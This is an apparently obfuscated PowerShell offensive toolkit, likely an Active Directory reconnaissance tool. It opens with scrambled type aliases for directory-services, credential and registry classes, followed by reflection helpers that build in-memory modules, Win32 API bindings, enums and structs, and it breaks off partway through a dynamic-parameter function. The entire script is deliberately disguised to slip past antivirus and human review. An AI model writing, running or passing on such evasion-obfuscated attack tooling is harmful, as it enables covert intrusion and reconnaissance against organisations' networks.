$28ShnW=[typE]("{0}{1}" -F 'guI','d')  ;   sV Ey3Qnv ( [tYPe]("{7}{8}{9}{4}{5}{3}{2}{6}{0}{1}"-F'CalLinGCOn','venTION','Op','r','.IN','Te','seRvIcEs.','runT','I','ME')  ) ;  $6utV=  [tYPe]("{3}{1}{8}{6}{2}{0}{4}{5}{7}"-f'e','unt','PsERvic','R','S.cHar','s','ERo','et','ImE.InT') ;    seT-variABle nVgApf ([TYpE]("{3}{12}{6}{5}{4}{0}{1}{9}{10}{7}{2}{8}{11}"-F'S','.dl','Tt','rUN','eRoPsERvicE','inT','ime.','rta','R','L','IMPo','iBuTe','T')  );  $K4D = [TyPe]("{4}{1}{0}{3}{2}" -f't','AT','Te','RiBU','fLAGs')  ;  sEt-VAriable ('R5'+'4xC') ( [tyPE]("{2}{1}{6}{0}{5}{3}{4}"-f 'EMIt.PacKing','FLEC','Re','i','Ze','S','tiON.'));$ozmrdc  = [tyPE]("{2}{3}{1}{0}{4}" -f'EATTr','Yp','RefL','ECTIOn.T','IbuteS') ;  $mHQg =[TYPe]("{7}{5}{0}{2}{1}{4}{6}{3}"-f 'vI','A','CEs.MArSH','E','lasAttR','ErOpSEr','IBUT','RUnTImE.InT') ; SET-item  ("vaRi"+"abl"+"e:sB"+"T") ([tYPE]("{0}{1}" -f 't','yPE'));   sET-vaRiaBLe Uzc ( [tYpe]("{2}{1}{0}{6}{4}{7}{5}{3}"-f'.','tioN','REFLEC','Es','I','d','em','t.OPcO'));  sEt-VariAblE  zN8Id (  [Type]("{0}{1}"-F 'i','O.PatH')  )  ; $p4mGk = [TypE]("{1}{0}{2}{3}" -f'stEm','sY','.iO.FI','lE') ;  sET-iteM ('VARIABlE:'+'D'+'cT'+'H') (  [tYPE]("{1}{3}{2}{0}{4}"-F'iO.fIlem','s','.','YstEm','OdE') ) ; set-ITEM VAriAbLe:6AcU (  [TyPe]("{4}{2}{3}{0}{1}{5}"-f'iLEA','cce','.iO','.f','sysTEm','Ss')  ) ;   $rfqP40= [tYPE]("{0}{1}{2}{3}" -f 'iO.f','iL','e','sHarE')  ;   Set-variaBLe d4r ( [TYPE]("{1}{0}"-F'NS','net.d') ) ;   seT-Item  VaRiablE:kH3d6  (  [typE]("{0}{2}{1}"-f'ac','vAtoR','TI') ) ;$4WXP=[TYpE]("{1}{4}{2}{6}{0}{3}{5}"-f 'iN','Sy','rEa','G.','STEM.tH','tHREaD','d') ;   $2EoM=[TypE]("{2}{3}{1}{4}{0}" -F 'BlY','cti','RefL','E','oN.ASSEm') ;   Set-ItEm  vaRiABlE:97UYf  ([type]("{0}{3}{1}{2}"-F 'SyS','.BITCoNVErTE','R','tEM') ) ;   SeT-itEm  ('Vari'+'abLE'+':up9') (  [type]("{2}{5}{4}{7}{1}{3}{6}{0}"-f'LAgS','In','SysTeM.','d','fLeCtIon.','Re','InGF','b'))  ; $uiG =[tyPE]("{7}{11}{0}{5}{13}{6}{3}{4}{9}{10}{1}{2}{12}{8}" -F 'STE','R','AlchaSing','RviCes.Re','f','M.DI','e','s','tIoN','e','R','Y','OP','RECTORYs'); sV  W7tV6Z  ([tYPe]("{3}{6}{4}{2}{1}{0}{5}" -f 'SEcURit','IRECtoRYSErViCeS.','m.D','S','e','ymaSks','YST') ) ;  SeT-ITEM  vArIaBle:fl1 (  [tYPe]("{0}{1}" -f'ar','raY')  );SV tUl1 (  [tYpe]("{0}{2}{3}{1}{4}" -f'SysT','.Conv','e','M','eRt'));  Set-ItEM vARIaBLE:p19ZTD ([tyPE]("{1}{9}{4}{10}{3}{6}{5}{2}{7}{0}{8}{11}" -f 'R','SYsTEm','.ACTIVE','Y','IreC','ICES','seRV','DiReCTo','Y.DOmaI','.D','tor','n')  ) ;  SeT-VARiablE I92 (  [tyPe]("{1}{2}{0}"-F 'T','cON','VeR'));    SeT-VaRIaBle ("6He"+"I4")  ( [TyPE]("{0}{1}" -F'En','um')) ; set-vaRIABlE ("2EM"+"Q"+"H6")  ([TyPe]("{2}{0}{1}{3}" -f'CO','NvERte','BiT','R'));sEt-vAriaBlE uA05X3  ([tYpE]("{3}{1}{2}{0}"-F 'xT.EncoDiNg','STEM.T','e','sy')  )  ;  sV i06  (  [TYpe]("{1}{0}{4}{6}{3}{5}{2}" -F'Tem.','SyS','s','inGs','St','PLITOPTION','r') )  ;   $572  = [tyPE]("{1}{0}" -F 'GEX','re') ;  SEt-iTEM VaRIaBLE:x5w41Q (  [tyPE]("{2}{4}{1}{0}{5}{3}" -F'in3','W','M','reGiStrYkey','IcROSOft.','2.')) ;   $7dK=[tYPE]("{1}{5}{7}{3}{6}{0}{2}{4}{8}" -F'PSErv','sYST','IceS.M','NtIme.In','ArsH','eM','TErO','.ru','Al') ; sV  ('504'+'2'+'HB')  (  [tyPE]("{2}{0}{1}"-F'O.f','ILE','i') )  ;    SEt-IteM  vARIable:pzl  (  [TYpe]("{6}{2}{8}{5}{9}{1}{4}{3}{7}{0}"-F'LSeSSIONsTaTe','Es','enT.auT','t','.iNi','ON.rUNsP','SysteM.ManaGeM','iA','oMati','ac') )  ;$VrLM  = [tyPe]("{4}{3}{1}{2}{0}{6}{5}"-f 'RtM','hREad','ING.APa','Tem.T','Sys','ate','enTST') ;    SeT-iteM ("VArIA"+"Ble:"+"pr487")  ([TyPe]("{1}{2}{0}" -F 'eFAcTORY','rUnsP','ac') ) ;  $l69 = [TyPE]("{2}{1}{0}" -f'Ll','rshE','pOWE');   Set-ItEm ('vari'+'ab'+'le:VXN'+'26J')  (  [tyPE]("{0}{2}{3}{1}"-f'e','t','NV','IRoNmEN')  )  ;  SEt-iTem  ('v'+'ari'+'Able:7AP'+'4q')  (  [TYPe]("{0}{1}{2}{3}" -f'SYste','M.NET','.D','NS') )  ;  SeT eZy ([TyPE]("{1}{2}{0}"-f 'e','da','TetiM'))  ;   Set-VAriABLe  ("AXY"+"1F")  (  [typE]("{0}{1}{2}{3}"-F 'IO.DIR','E','c','tORy'))  ;   SeT-Item vaRiablE:5OAW3  (  [tYPE]("{5}{6}{7}{2}{3}{8}{1}{0}{4}" -f'pAl','i','iTy','.pri','.wELlknoWnsIDTYpe','s','yStem.secu','r','nc'));   $NRq =[tYPe]("{0}{1}{2}{7}{5}{6}{3}{4}" -f'ruN','tIM','E','RvICeS.mar','sHal','int','EROpse','.') ;sEt-iTEm vARIaBLe:21Gv7E  ([TYpE]("{1}{3}{5}{2}{4}{0}"-f 'Al','mANa','iON.PS','gEmEn','CREdENTI','T.AUTOmaT') ) ;  seT-iTEm  ('VA'+'riaBL'+'E:hT9')  ( [tyPE]("{1}{0}{9}{4}{13}{3}{7}{6}{11}{5}{12}{2}{8}{10}" -f 'YSTem.dir','S','y.FoR','C','oryS','o','t','Es.Ac','es','ECT','T','IvedIRect','r','Ervi')  );   sET-iteM ('VARiA'+'B'+'L'+'e'+':z5wnB')  ([tyPE]("{0}{1}{2}" -F'StR','i','ng') )  ;  $nFV =  [tyPe]("{2}{1}{0}" -F'tR','tP','In'); SeT-ItEm ('VArIAbLe'+':'+'i'+'Gx7') ( [TyPe]("{1}{0}" -f '32','int')  )  ;












function neW-in`M`Emo`RymOD`ULe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{4}{5}{0}{3}{2}{1}{7}{6}{9}" -f'ou','eCh','Stat','ldProcessFor','e','Sh','gFuncti','angin','PSUs','ons'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(PosITioN = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${mOdul`E`NaMe} =  ( gI VarIABlE:28sHNw ).VAlUe::("{1}{0}" -f'ewGuid','N').Invoke().("{2}{1}{0}" -f 'g','in','ToStr').Invoke()
    )

    ${appdO`M`A`In} =   (VARIABle  ('2Eo'+'m') ).ValUE."as`sEm`Bly".("{1}{2}{0}"-f'e','GetT','yp').Invoke(("{1}{2}{0}{3}"-f 'pDom','System','.Ap','ain')).("{1}{2}{0}" -f'y','GetProp','ert').Invoke(("{0}{3}{2}{1}"-f'Cu','ain','m','rrentDo')).("{0}{2}{1}"-f'G','lue','etVa').Invoke(${nU`Ll}, @())
    ${LoAd`Ed`ASsemB`l`ies} = ${ApPd`oM`A`iN}.("{1}{2}{3}{0}"-f 'emblies','G','etA','ss').Invoke()

    foreach (${a`ssEm`Bly} in ${loA`DEdaS`sEmb`LiES}) {
        if (${As`sEMb`lY}."Ful`lname" -and (${ASsEM`B`ly}."Ful`LnA`mE".("{1}{0}"-f'plit','S').Invoke(',')[0] -eq ${M`ODUl`EN`Ame})) {
            return ${aSS`eMblY}
        }
    }

    ${d`ynAssem`BLy} = &("{1}{0}{2}{3}"-f'b','New-O','je','ct') ("{2}{4}{6}{3}{1}{5}{0}" -f'yName','As','Ref','.','lectio','sembl','n')(${MO`DuLe`N`AMe})
    ${d`OMaIn} = ${ApPD`oMA`in}
    ${Ass`Emb`LyBu`I`l`deR} = ${dOMA`in}.("{3}{1}{4}{0}{2}" -f 'e','fineD','mbly','De','ynamicAss').Invoke(${dY`Nas`semB`lY}, 'Run')
    ${MO`DuLebu`IlDeR} = ${A`S`seMB`LYbUiLD`er}.("{0}{4}{1}{2}{5}{3}"-f 'Defi','yn','amicM','dule','neD','o').Invoke(${m`oDu`lENAMe}, ${fa`Lse})

    return ${mOduL`eb`UIL`DeR}
}




function fu`NC {
    Param (
        [Parameter(posItioN = 0, manDaTOrY = ${t`RUe})]
        [String]
        ${DLl`N`Ame},

        [Parameter(positIoN = 1, MAndatorY = ${Tr`Ue})]
        [string]
        ${FuN`CT`IoNNaMe},

        [Parameter(POsitIon = 2, mANdATOry = ${t`RuE})]
        [Type]
        ${Re`TU`RN`TyPe},

        [Parameter(poSItioN = 3)]
        [Type[]]
        ${PAra`ME`TERTYPEs},

        [Parameter(POsitIoN = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${na`TIVEcaLl`INGcO`N`VENTi`On},

        [Parameter(POsiTioN = 5)]
        [Runtime.InteropServices.CharSet]
        ${cHaRS`et},

        [String]
        ${ENtr`Y`PoinT},

        [Switch]
        ${SET`L`AsTe`RRor}
    )

    ${PrO`peRT`IeS} = @{
        ("{0}{1}"-f'DllNam','e') = ${DLlN`A`mE}
        ("{0}{3}{2}{1}" -f 'Funct','e','onNam','i') = ${FUncti`ON`Na`mE}
        ("{1}{2}{0}" -f 'Type','Re','turn') = ${r`ETUrnT`YPe}
    }

    if (${PArAmET`eRt`Yp`ES}) { ${PR`oPErti`Es}[("{0}{1}{2}" -f'Paramet','e','rTypes')] = ${parAMe`TERty`PES} }
    if (${NaT`i`V`e`CaLLingCOnve`N`TION}) { ${P`Rope`Rt`iES}[("{1}{2}{3}{5}{0}{4}{6}"-f 'gC','Na','tiveCa','ll','onvent','in','ion')] = ${na`T`i`V`eCalLinGc`OnventI`ON} }
    if (${chA`R`SeT}) { ${PrO`PE`R`TiES}[("{1}{0}"-f 't','Charse')] = ${chAr`SET} }
    if (${sE`Tla`sTeRr`or}) { ${pr`OpEr`TIEs}[("{0}{1}{2}" -f 'Set','Las','tError')] = ${Set`la`ST`err`oR} }
    if (${enTrY`P`oInT}) { ${P`R`oPERtiES}[("{2}{3}{1}{0}"-f'int','Po','Ent','ry')] = ${E`Nt`RyPOi`Nt} }

    &("{0}{2}{1}{3}" -f'N','-O','ew','bject') ("{2}{0}{1}" -f 'je','ct','PSOb') -Property ${p`RO`P`ERTIes}
}


function aDD-w`IN3`2`TYPe
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(mANDAtoRY=${t`RUE}, vAlUEfrOmpIPelinEbYPRoPERtynAmE=${t`RUe})]
        [String]
        ${dll`NaME},

        [Parameter(maNDAToRY=${tr`UE}, VALUeFROmPiPELiNebYpropeRtYNAMe=${Tr`UE})]
        [String]
        ${f`UnCtIO`Nna`Me},

        [Parameter(vALUEFRoMPIPelInEbYProPertynAMe=${T`RuE})]
        [String]
        ${enTRyP`o`iNT},

        [Parameter(mANdatoRy=${T`RUE}, ValuefROMPiPELinebypRopeRtynAmE=${tr`Ue})]
        [Type]
        ${RE`TuRNt`YpE},

        [Parameter(VaLuEFrOMPIPelINebYPRopErTYNAmE=${Tr`UE})]
        [Type[]]
        ${PAra`metE`R`TyPES},

        [Parameter(vaLUeFroMpIpELinEBYpROPeRTYname=${TR`Ue})]
        [Runtime.InteropServices.CallingConvention]
        ${N`A`TI`V`ECaLlinGcONVEn`T`i`ON} =  $ey3QNV::"sTd`CALL",

        [Parameter(vAluefromPiPeLINEByproPerTYNaME=${T`RUE})]
        [Runtime.InteropServices.CharSet]
        ${ChA`Rs`et} =  (geT-vArIaBle 6UtV  ).vaLue::"A`UtO",

        [Parameter(ValuefROMpiPeLINEBYpROpERtyNAMe=${tr`Ue})]
        [Switch]
        ${sET`lAS`Te`Rr`Or},

        [Parameter(MandAtorY=${t`RuE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${m`oDULE},

        [ValidateNotNull()]
        [String]
        ${n`AME`S`pAce} = ''
    )

    BEGIN
    {
        ${t`ype`HASh} = @{}
    }

    PROCESS
    {
        if (${M`odu`lE} -is [Reflection.Assembly])
        {
            if (${nAM`e`SPACe})
            {
                ${Typ`ehAsh}[${dll`NA`Me}] = ${mODu`le}.("{1}{0}{2}" -f'Typ','Get','e').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${typeh`ASH}[${Dll`NaMe}] = ${moD`UlE}.("{0}{1}"-f'GetTyp','e').Invoke(${d`LL`NAMe})
            }
        }
        else
        {
            
            if (!${TY`pEHAsH}.("{3}{0}{1}{2}" -f 't','a','insKey','Con').Invoke(${dl`LNA`ME}))
            {
                if (${na`Me`SPAce})
                {
                    ${t`y`P`eHash}[${dll`Na`ME}] = ${Mo`Du`le}.("{1}{0}{3}{2}" -f 'n','Defi','pe','eTy').Invoke("$Namespace.$DllName", ("{3}{0}{2}{5}{6}{4}{1}" -f'u','it','blic,Bef','P','ieldIn','ore','F'))
                }
                else
                {
                    ${tYP`e`hASH}[${D`lLn`AmE}] = ${M`OD`UlE}.("{0}{2}{1}" -f 'DefineTy','e','p').Invoke(${D`ll`NAmE}, ("{4}{1}{3}{0}{2}" -f 'eforeFieldI',',','nit','B','Public'))
                }
            }

            ${Me`T`HOd} = ${tYPe`HaSh}[${D`llna`ME}].("{2}{0}{1}" -f'ineMet','hod','Def').Invoke(
                ${FUNC`T`iO`NnamE},
                ("{1}{4}{3}{5}{2}{0}{6}"-f'nv','Publi','i','t','c,Sta','ic,P','okeImpl'),
                ${RE`Tur`Nt`YpE},
                ${PArAmeTe`R`TypeS})

            
            ${i} = 1
            foreach(${PARa`M`eTEr} in ${PaRAM`ETe`Rty`pes})
            {
                if (${P`A`RAmeTer}."isb`YR`ef")
                {
                    [void] ${M`etHoD}.("{4}{2}{1}{0}{3}"-f'e','Param','e','ter','Defin').Invoke(${i}, 'Out', ${N`ULL})
                }

                ${i}++
            }

            ${DL`limp`orT} = [Runtime.InteropServices.DllImportAttribute]
            ${SET`LasTerro`RFi`e`LD} = ${DLlIm`p`ort}.("{1}{0}"-f'd','GetFiel').Invoke(("{2}{0}{1}{3}" -f'Las','tEr','Set','ror'))
            ${CaLlING`coNv`ENT`IOnFi`ELd} = ${dL`lI`Mp`ort}.("{2}{0}{1}" -f 'et','Field','G').Invoke(("{3}{1}{0}{2}"-f 'o','lingConventi','n','Cal'))
            ${Ch`ArSETfiE`ld} = ${D`lL`ImPort}.("{0}{1}" -f'G','etField').Invoke(("{1}{0}"-f'arSet','Ch'))
            ${eNt`R`y`pO`INTfIelD} = ${dLL`ImP`Ort}.("{0}{2}{1}" -f 'Get','eld','Fi').Invoke(("{0}{2}{1}" -f 'Ent','t','ryPoin'))
            if (${SEt`LasTE`RrOR}) { ${slevA`l`UE} = ${t`RUE} } else { ${Sl`EvALue} = ${faL`se} }

            if (${pSboun`DPar`AmE`TERS}[("{2}{1}{0}"-f'int','tryPo','En')]) { ${Ex`P`oRTE`dfUncNamE} = ${EntR`YPO`iNT} } else { ${Exp`OrTe`D`F`UNcNaMe} = ${FUN`cT`iO`NNaME} }

            
            ${cO`NsT`RU`CTOr} =   (  iTem vARIabLE:nvgapf ).ValUe."gEtCo`N`Str`U`cTor"([String])
            ${dlL`i`mpO`Rt`Att`RiBUTE} = &("{0}{2}{1}"-f 'Ne','ject','w-Ob') ("{10}{2}{9}{4}{6}{8}{1}{5}{11}{0}{3}{7}" -f'ribu','Cust','t','teB','.Em','omAt','it','uilder','.','ion','Reflec','t')(${ConstRuC`T`or},
                ${d`llnaME}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${s`eT`laSteRRORf`I`eld},
                                           ${C`A`LlINGcon`VEntiO`Nf`iElD},
                                           ${c`HAR`SE`TField},
                                           ${EN`Try`POI`NtfIELd}),
                [Object[]] @(${sLeV`AL`UE},
                             ([Runtime.InteropServices.CallingConvention] ${N`ATiVe`cAlLi`NgC`oN`V`ENtiOn}),
                             ([Runtime.InteropServices.CharSet] ${cH`Ar`sET}),
                             ${e`Xp`OrT`EDFU`N`CnamE}))

            ${M`e`Thod}.("{2}{1}{3}{0}" -f 'ribute','mAt','SetCusto','t').Invoke(${dLL`Im`PoRtat`Tri`BUTE})
        }
    }

    END
    {
        if (${M`oDu`le} -is [Reflection.Assembly])
        {
            return ${TyPe`hA`sH}
        }

        ${reTuRnt`y`P`eS} = @{}

        foreach (${K`Ey} in ${Typeh`A`Sh}."k`eys")
        {
            ${ty`Pe} = ${tYpEH`Ash}[${k`Ey}].("{3}{2}{0}{1}"-f 'ateT','ype','re','C').Invoke()

            ${RET`U`RntypES}[${K`eY}] = ${t`YPe}
        }

        return ${R`etUR`NTy`PeS}
    }
}


function p`seN`UM {


    [OutputType([Type])]
    Param (
        [Parameter(pOsiTiOn = 0, MaNDAToRy=${t`RUe})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${M`odu`LE},

        [Parameter(pOSitIon = 1, maNdatoRy=${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`ULl`Name},

        [Parameter(POsITioN = 2, maNDAtOry=${t`Rue})]
        [Type]
        ${Ty`PE},

        [Parameter(posiTiON = 3, maNdAToRY=${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${En`Um`ELeme`NTs},

        [Switch]
        ${B`ItF`I`ElD}
    )

    if (${m`o`dulE} -is [Reflection.Assembly])
    {
        return (${mO`D`ULE}.("{1}{0}"-f'tType','Ge').Invoke(${ful`lnAME}))
    }

    ${eN`Um`T`YPE} = ${TY`PE} -as [Type]

    ${e`NUM`BUI`ldEr} = ${M`odULe}.("{0}{3}{2}{1}"-f 'De','m','ineEnu','f').Invoke(${f`ULL`NA`me}, ("{0}{1}" -f 'Publ','ic'), ${E`N`U`MtYPe})

    if (${B`ItfI`ELD})
    {
        ${F`lAgSc`OnstrUC`ToR} =   (variabLE K4D  -VAl)."GetcOnS`T`RUCtor"(@())
        ${F`lA`gScUsT`o`MATtRIBUtE} = &("{1}{2}{0}"-f'ect','Ne','w-Obj') ("{8}{1}{3}{11}{0}{2}{9}{10}{7}{5}{4}{6}"-f '.C','ction.','ustom','Em','Bu','e','ilder','ut','Refle','Attr','ib','it')(${F`lags`C`o`Ns`TrUcTOr}, @())
        ${E`NUmbui`lDER}.("{4}{5}{2}{3}{0}{1}"-f'mAttribu','te','s','to','S','etCu').Invoke(${Fl`AGsc`USTO`MatTrIb`U`TE})
    }

    foreach (${k`ey} in ${ENU`MEl`E`MentS}."kE`YS")
    {
        
        ${NU`ll} = ${e`NuM`Bu`iLDer}."dEFi`NeLI`TeRal"(${K`eY}, ${eNUmELeM`E`N`TS}[${K`ey}] -as ${eN`U`M`TYpE})
    }

    ${eNuMB`U`ILD`er}.("{1}{0}{2}" -f'eTy','Creat','pe').Invoke()
}




function fi`eld {
    Param (
        [Parameter(pOsITIOn = 0, MAndAtOrY=${t`RUe})]
        [UInt16]
        ${p`osi`TIoN},

        [Parameter(Position = 1, mANdAtorY=${t`RUe})]
        [Type]
        ${tY`Pe},

        [Parameter(poSiTIon = 2)]
        [UInt16]
        ${OF`Fset},

        [Object[]]
        ${m`ARshA`LaS}
    )

    @{
        PoSiTIon = ${pOSI`T`IoN}
        ("{1}{0}" -f 'e','Typ') = ${T`YPe} -as [Type]
        ("{1}{0}"-f't','Offse') = ${OffS`Et}
        ("{2}{0}{1}"-f 'shal','As','Mar') = ${mArSHa`L`AS}
    }
}


function S`TRUCt
{


    [OutputType([Type])]
    Param (
        [Parameter(POSItiON = 1, MAnDatORY=${T`RuE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MOD`UlE},

        [Parameter(PosiTIOn = 2, ManDATorY=${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`ULlnA`mE},

        [Parameter(POsItiOn = 3, maNdaToRy=${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${S`Tr`UctFiE`Lds},

        [Reflection.Emit.PackingSize]
        ${PAckI`NGS`i`ze} =   ( itEm  ("V"+"Ar"+"iABLE:R5"+"4Xc")).valUe::"uNsPECI`FI`Ed",

        [Switch]
        ${exPL`ic`ITlAYo`Ut}
    )

    if (${MoD`ULe} -is [Reflection.Assembly])
    {
        return (${moDU`LE}.("{2}{0}{1}" -f 'etTyp','e','G').Invoke(${fU`lL`Name}))
    }

    [Reflection.TypeAttributes] ${STrU`CTATtriBU`T`ES} = ("{7}{18}{16}{14}{12}{17}{6}{15}{19}{8}{0}{10}{2}{1}{11}{4}{13}{9}{5}{3}"-f 'Pub','
    ','c,','Init','  ','ield','ass,
  ','A','  ','led,
        BeforeF','li','  ','    ','Sea','ss,
  ',' ','a','  Cl','nsiCl','   ')

    if (${eXpLIC`it`L`AYOut})
    {
        ${s`Tr`UctatTrI`BUt`Es} = ${St`RucTaTTR`Ib`Ut`es} -bor   $ozMRdC::"EXpLIcI`T`LA`yOuT"
    }
    else
    {
        ${sTRU`CTA`TT`RiBuTEs} = ${ST`R`UcTaTtr`i`BUtES} -bor   $OZmRdC::"S`eQuenTiaL`LA`yOUT"
    }

    ${S`TRUc`TB`UILDeR} = ${M`ODUlE}."D`EfiNeTY`pe"(${fu`lLNa`mE}, ${STRUct`AtT`RiB`UtEs}, [ValueType], ${pa`CKI`NGsiZe})
    ${con`stru`C`ToRI`Nfo} =  (CHildITEm vARiAble:mHQg ).vALue.("{0}{1}{4}{3}{2}"-f'Get','Con','s','tructor','s').Invoke()[0]
    ${si`zEC`onSt} = @( ( chiLdITeM ("vaR"+"iABlE"+":m"+"HQg")).vALUe.("{0}{1}{2}"-f'Get','Fi','eld').Invoke(("{2}{1}{0}" -f'st','izeCon','S')))

    ${Fi`ELDS} = &("{0}{1}{2}"-f 'N','ew-Obje','ct') ("{0}{2}{1}"-f 'Hasht',']','able[')(${STR`UC`TfIeL`dS}."cO`UNT")

    
    
    
    foreach (${F`IELd} in ${struC`TF`ieL`DS}."k`EYS")
    {
        ${I`NdEx} = ${st`R`UC`T`FIELDS}[${f`Ie`LD}][("{2}{1}{0}"-f 'tion','i','Pos')]
        ${fI`EL`ds}[${In`dEx}] = @{("{0}{2}{1}"-f 'Fie','dName','l') = ${fI`E`Ld}; ("{0}{1}{2}" -f'Prope','r','ties') = ${STR`Uc`TfIElDs}[${fI`E`ld}]}
    }

    foreach (${f`IELd} in ${F`iE`ldS})
    {
        ${f`IelD`NamE} = ${Fi`Eld}[("{2}{1}{0}{3}"-f'l','ie','F','dName')]
        ${FiElD`p`ROP} = ${Fi`eLD}[("{2}{0}{1}"-f 'e','rties','Prop')]

        ${OF`F`SET} = ${fi`eLd`PRop}[("{1}{0}" -f'fset','Of')]
        ${Ty`pe} = ${f`I`ELdp`Rop}[("{1}{0}"-f 'e','Typ')]
        ${m`ArSh`Al`As} = ${F`IElD`pr`oP}[("{0}{1}" -f'Ma','rshalAs')]

        ${nE`WFI`Eld} = ${St`RuctbUIld`ER}.("{1}{2}{0}"-f'ield','Define','F').Invoke(${FIeL`Dn`Ame}, ${TY`PE}, ("{0}{2}{1}"-f 'P','blic','u'))

        if (${M`Ar`SHAl`AS})
        {
            ${uNMa`NA`GeD`T`YPE} = ${mA`RShAl`As}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${M`A`RSHalas}[1])
            {
                ${S`ize} = ${m`ARSH`ALaS}[1]
                ${aT`Tribbu`ilder} = &("{1}{0}{2}{3}"-f'ew','N','-Obj','ect') ("{4}{3}{1}{0}{2}{5}{6}"-f'to','on.Emit.Cus','mAt','flecti','Re','tri','buteBuilder')(${CoNS`TRu`CtoR`iNFo},
                    ${U`Nm`AN`AGeD`Type}, ${Siz`e`Const}, @(${si`zE}))
            }
            else
            {
                ${A`T`T`RibbUildER} = &("{0}{2}{1}{3}" -f 'New-','bjec','O','t') ("{5}{8}{0}{1}{6}{3}{2}{7}{4}"-f '.Emit','.CustomAt','te','ribu','er','R','t','Build','eflection')(${CONST`RUc`To`RIN`Fo}, [Object[]] @(${Unm`AnagED`T`ype}))
            }

            ${Newfie`LD}.("{3}{1}{0}{2}"-f 't','mAt','ribute','SetCusto').Invoke(${AttR`ib`BuilDer})
        }

        if (${e`X`pliCitl`AYO`UT}) { ${new`FIElD}.("{1}{0}{2}"-f'e','S','tOffset').Invoke(${OF`FSET}) }
    }

    
    
    ${si`ZEM`etHOd} = ${s`TRuC`TBu`IldEr}.("{3}{2}{1}{0}" -f'd','o','neMeth','Defi').Invoke(("{0}{1}"-f 'Ge','tSize'),
        ("{2}{1}{3}{0}" -f'tatic','b','Pu','lic, S'),
        [Int],
        [Type[]] @())
    ${i`LGENEraT`or} = ${siZE`ME`TH`Od}.("{3}{1}{2}{0}" -f 'or','L','Generat','GetI').Invoke()
    
    ${IL`gEn`era`TOR}."E`mIT"(  (  GET-VArIaBLE  UZc  -ValUeO)::"L`dtOKEn", ${STRUct`B`Uild`Er})
    ${il`gEn`e`RAtoR}."E`mit"( (VAriaBLE  ('uz'+'c') -VAlueoNl )::"c`ALL",
          (geT-VARiAblE sBt ).vAlUe.("{2}{1}{0}" -f 'Method','et','G').Invoke(("{2}{0}{1}{3}"-f 'rom','Ha','GetTypeF','ndle')))
    ${iLge`NeRa`TOR}."Em`it"(  (  vArIable Uzc -vA )::"Ca`LL",
          $NRq.("{0}{1}{2}"-f'Get','Me','thod').Invoke(("{1}{0}"-f'izeOf','S'), [Type[]] @([Type])))
    ${iL`G`eNeRAT`OR}."E`MIT"(  ( VARIablE ('UZ'+'C')  ).ValUe::"r`ET")

    
    
    ${I`M`PlIcItCoNve`RtER} = ${sTR`UcT`BuilDer}.("{3}{1}{0}{2}" -f'eth','fineM','od','De').Invoke(("{1}{2}{0}" -f 'icit','op','_Impl'),
        ("{5}{2}{6}{3}{0}{8}{7}{4}{1}"-f 'i','Name','ivat','e, Public, Static, H','cial','Pr','eScop','ySig, Spe','deB'),
        ${STR`UC`Tbu`iLdER},
        [Type[]] @([IntPtr]))
    ${IlgE`NE`R`ATOR2} = ${imp`lIc`i`TcOn`VERtER}.("{1}{0}{3}{2}{4}" -f'etIL','G','a','Gener','tor').Invoke()
    ${ILGe`NER`ATOr2}."EM`it"(  $UZC::"n`OP")
    ${ilGen`E`RATOr2}."e`MiT"( (  GI  ('Varia'+'BL'+'e:uz'+'C') ).VALUe::"Lda`RG_0")
    ${ilgEn`ErA`T`O`R2}."Em`iT"( ( VARIAbLe  UZC  -VAlUEonlY  )::"l`d`ToKeN", ${s`TRU`ctbUIl`der})
    ${iLG`e`NerAt`oR2}."e`mIt"( (  vArIaBLE  ('uz'+'c') -vALuE  )::"Ca`LL",
         $sBt.("{0}{1}" -f 'GetMetho','d').Invoke(("{0}{4}{1}{3}{2}"-f 'Get','Fr','dle','omHan','Type')))
    ${iLgener`AT`o`R2}."EM`iT"(  (  VAriable  ("UZ"+"C") -vaLUeOnly  )::"c`All",
         (ChildiTem  ('V'+'ARIA'+'B'+'LE:NRQ')  ).VaLUE.("{0}{2}{1}"-f'GetMet','d','ho').Invoke(("{1}{3}{2}{0}"-f'e','P','ctur','trToStru'), [Type[]] @([IntPtr], [Type])))
    ${I`lge`Nera`TOr2}."em`It"(  $Uzc::"u`NBox_`ANy", ${StRuct`B`U`ilDer})
    ${iLG`enE`R`AtO`R2}."E`Mit"( $Uzc::"r`eT")

    ${stR`UCtBu`ilD`eR}.("{0}{1}{2}"-f'Cre','ateT','ype').Invoke()
}








Function n`ew-`D`YNAmIcparAmeT`Er {


    [CmdletBinding(dEfAuLtPaRAmEtERsEtName = {"{3}{2}{1}{0}" -f'eter','Param','ic','Dynam'})]
    Param (
        [Parameter(MAnDaToRY = ${T`RUE}, vAlUefROMpIPElInE = ${t`RUe}, VaLUefroMpipElINebypROpErtyNAME = ${TR`Ue}, pARameTerSETNaMe = "dYNA`micp`AraM`e`TEr")]
        [ValidateNotNullOrEmpty()]
        [string]${n`AmE},

        [Parameter(VAlUEFroMpIPeLIneBypRopERtynAmE = ${T`Rue}, pArAmETErsETnaMe = "dYNaM`icPar`Ame`T`Er")]
        [System.Type]${T`YPe} = [int],

        [Parameter(valuEFrOMpIPELinebYPROPERTyNAmE = ${t`RUE}, parAMetERSeTNAme = "Dynam`Icp`A`RAMeteR")]
        [string[]]${A`li`As},

        [Parameter(vAluefrOMpiPeLIneBYproPErTynaMe = ${Tr`UE}, pARAMeterSetnamE = "DyNAM`icPaR`A`MEtEr")]
        [switch]${mANd`AT`ORY},

